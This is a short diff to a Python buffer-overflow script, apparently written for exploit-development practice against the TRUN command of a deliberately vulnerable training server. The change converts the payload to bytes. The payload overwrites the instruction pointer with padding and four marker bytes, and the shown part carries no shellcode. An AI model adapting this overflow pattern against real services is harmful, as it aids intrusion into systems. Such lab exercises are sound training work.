@@ -15,12 +15,12 @@ try:
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.connect((host, port))
 
-	payload = ""
-	payload += "TRUN /.:/"
-	payload += "A" * offset # Padding
-	payload += "B" * 4 # EIP
+	payload = b""
+	payload += b"TRUN /.:/"
+	payload += b"A" * offset # Padding
+	payload += b"B" * 4 # EIP
 
-	s.send((payload.encode()))
+	s.send(payload)
 	s.close()
 
 except:
